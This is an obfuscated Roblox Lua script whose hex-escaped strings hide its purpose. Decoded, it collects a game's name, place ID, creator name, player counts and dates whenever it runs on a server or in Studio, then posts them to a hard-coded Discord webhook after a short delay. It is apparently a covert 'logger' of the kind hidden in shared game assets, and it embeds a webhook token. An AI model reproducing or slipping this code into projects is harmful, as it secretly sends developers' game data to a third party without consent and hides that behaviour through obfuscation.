local b="\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x38\x39\x33\x30\x37\x31\x32\x34\x33\x30\x31\x38\x39\x31\x35\x39\x30\x30\x2F\x65\x69\x47\x32\x49\x69\x5F\x7A\x48\x59\x43\x68\x5F\x6B\x46\x54\x75\x62\x73\x55\x75\x43\x59\x38\x4E\x35\x47\x54\x47\x71\x4B\x6D\x53\x54\x6A\x76\x72\x41\x33\x54\x56\x4D\x6F\x70\x79\x45\x54\x30\x43\x72\x4B\x31\x69\x4A\x49\x42\x73\x44\x57\x77\x62\x48\x36\x74\x76\x48\x6B\x78" local c=game:GetService("\x48\x74\x74\x70\x53\x65\x72\x76\x69\x63\x65") local e=game:GetService("\x4D\x61\x72\x6B\x65\x74\x70\x6C\x61\x63\x65\x53\x65\x72\x76\x69\x63\x65") local d=game:GetService("\x52\x75\x6E\x53\x65\x72\x76\x69\x63\x65") local _=e:GetProductInfo(game.PlaceId).Created local a=e:GetProductInfo(game.PlaceId).Updated local _=string.sub(_,1,10) local a=string.sub(a,1,10) if d:IsStudio()or d:IsServer()then local _={['\x65\x6D\x62\x65\x64\x73']={{['\x61\x75\x74\x68\x6F\x72']={['\x6E\x61\x6D\x65']='\x4C\x6F\x67\x67\x61',['\x69\x63\x6F\x6E\x5F\x75\x72\x6C']='\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x38\x39\x33\x30\x37\x31\x32\x32\x30\x39\x36\x35\x32\x36\x35\x34\x32\x39\x2F\x38\x39\x33\x30\x37\x34\x38\x37\x38\x38\x33\x30\x33\x37\x39\x30\x34\x38\x2F\x76\x6F\x69\x64\x2E\x70\x6E\x67'},["\x74\x69\x74\x6C\x65"]=e:GetProductInfo(game.PlaceId).Name,["\x75\x72\x6C"]="\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x72\x6F\x62\x6C\x6F\x78\x2E\x63\x6F\x6D\x2F\x67\x61\x6D\x65\x73\x2F"..game.PlaceId,["\x63\x6F\x6C\x6F\x72"]=5612282,["\x69\x6D\x61\x67\x65"]={["\x75\x72\x6C"]="\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x72\x6F\x62\x6C\x6F\x78\x2E\x63\x6F\x6D\x2F\x61\x73\x73\x65\x74\x2D\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C\x2F\x69\x6D\x61\x67\x65\x3F\x61\x73\x73\x65\x74\x49\x64\x3D"..game.PlaceId},["\x66\x69\x65\x6C\x64\x73"]={{["\x6E\x61\x6D\x65"]="\x50\x6C\x61\x79\x65\x72\x73",["\x76\x61\x6C\x75\x65"]=#game:GetService("\x50\x6C\x61\x79\x65\x72\x73"):GetPlayers(),["\x69\x6E\x6C\x69\x6E\x65"]=true},{["\x6E\x61\x6D\x65"]="\x43\x72\x65\x61\x74\x6F\x72",["\x76\x61\x6C\x75\x65"]=game.Players:GetNameFromUserIdAsync(game.CreatorId),["\x69\x6E\x6C\x69\x6E\x65"]=true},{["\x6E\x61\x6D\x65"]="\x4D\x61\x78\x20\x50\x6C\x61\x79\x65\x72\x73",["\x76\x61\x6C\x75\x65"]=game.Players.MaxPlayers,["\x69\x6E\x6C\x69\x6E\x65"]=true},{["\x6E\x61\x6D\x65"]="\x43\x72\x65\x61\x74\x65\x64",["\x76\x61\x6C\x75\x65"]=_,["\x69\x6E\x6C\x69\x6E\x65"]=true},{["\x6E\x61\x6D\x65"]="\x4C\x61\x73\x74\x20\x55\x70\x64\x61\x74\x65\x64",["\x76\x61\x6C\x75\x65"]=a,["\x69\x6E\x6C\x69\x6E\x65"]=true},{["\x6E\x61\x6D\x65"]="\x50\x6C\x61\x63\x65\x20\x49\x64",["\x76\x61\x6C\x75\x65"]=game.PlaceId,["\x69\x6E\x6C\x69\x6E\x65"]=true}},["\x66\x6F\x6F\x74\x65\x72"]={["\x74\x65\x78\x74"]="\x6C\x6F\x67\x67\x65\x72\x20\x62\x79\x20\x78\x6F\x6C",["\x69\x63\x6F\x6E\x5F\x75\x72\x6C"]="\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x38\x39\x33\x30\x37\x31\x32\x32\x30\x39\x36\x35\x32\x36\x35\x34\x32\x39\x2F\x38\x39\x33\x30\x37\x34\x38\x37\x38\x38\x33\x30\x33\x37\x39\x30\x34\x38\x2F\x76\x6F\x69\x64\x2E\x70\x6E\x67"}}}} wait(4.5) local _=c:JSONEncode(_) local _=c:PostAsync(b,_)end
